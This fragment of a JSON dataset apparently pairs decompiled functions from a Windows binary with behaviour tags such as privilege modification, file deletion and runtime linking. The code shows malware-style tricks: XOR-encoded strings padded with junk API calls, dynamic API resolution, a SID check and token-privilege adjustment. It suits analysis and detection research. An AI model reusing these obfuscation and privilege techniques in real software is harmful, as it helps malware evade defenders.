        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040d130(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2bh;\n    uint var_27h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_18h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 == 0x7a) {\n            puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes);\n            var_1ch = puVar4;\n            if (puVar4 != NULL) {\n                iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n                if (iVar3 != 0) {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid);\n                    if ((iVar3 != 0) && (StringSid != 0)) {\n                        var_38h = 0x3040466a;\n                        var_34h = 0x6d6b3945;\n                        var_14h = 5;\n                        var_30h._0_1_ = 5;\n                        stack0xffffffcd = 0x5c461474;\n                        var_2bh = 0x46394c30;\n                        var_27h._0_1_ = 0x6d;\n                        stack0xffffffd8 = 0x306d4639;\n                        var_20h._0_1_ = 0x74;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        do {\n                            iVar5 = (*_sym.imp.USER32.dll_GetCursor)();\n                            if (iVar5 != 0x9eb598) {\n                                *(iVar6 + iVar3) = *(&var_27h + iVar6 % var_14h + 3) ^ (iVar6 + iVar3)[&var_38h - iVar3]\n                                ;\n                            }\n                            iVar6 = iVar6 + 1;\n                        } while (iVar6 < 0x12);\n                        iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                        iVar6 = var_18h;\n                        if (iVar5 == 0) {\n                            iVar6 = 1;\n                        }\n                        (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        puVar4 = var_1ch;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 893
    },
    "0040201f": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040201f(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41dde0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 217
    },
    "00408114": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00408114(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uchar var_20h;\n    uint var_1fh;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 6;\n    var_28h = 0x6102103;\n    var_24h = 0x33243406;\n    _var_20h = 0x31271607;\n    var_1fh._3_1_ = 0x62;\n    var_18h = 0x72624855;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x73);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar4;\n    var_10h = iVar4;\n    do {\n        iVar5 = (*pcVar1)();\n        if (iVar5 != 0x90c6c9) {\n            var_4h = 5;\n            *(iVar7 + iVar4) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar4)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_28h = 0x342b1338;\n    var_24h = 0x4460070b;\n    _var_20h = 0x7023e77;\n    var_1fh._3_1_ = 0x53;\n    var_18h = 0x5a597653;\n    var_14h._0_2_ = 0x6b6e;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar5 = var_10h;\n        if (iVar6 != 0xac8272) {\n            *(iVar7 + iVar4) = *(&var_18h + iVar7 % var_ch) ^ (iVar7 + iVar4)[&var_28h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 826
    },
    "0040da45": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040da45(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x16322320;\n    var_28h = 0x5d7224;\n    var_24h = 0x21301617;\n    var_20h._0_2_ = 0x231a;\n    var_20h._2_1_ = 0x65;\n    var_1ch = 0x79655069;\n    var_18h._0_2_ = 0x4453;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_8h = 6;\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    var_10h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar5 != 0x90f1f2) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_2ch = 0x342b1338;\n    var_28h = 0x4460070b;\n    var_24h = 0x7023e77;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x53);\n    var_1ch = 0x5a597653;\n    var_18h._0_2_ = 0x6b6e;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar5 = var_10h;\n        if (iVar6 != 0xac8272) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n    *0x41e21c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41e21c != NULL) {\n        iVar7 = (**0x41e21c)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 931
    },
    "00404449": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.00404449(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 336
    },
    "00404b69": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404b69(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.00404449();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040964c();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 188
    },
    "0040d324": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d324(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    }
}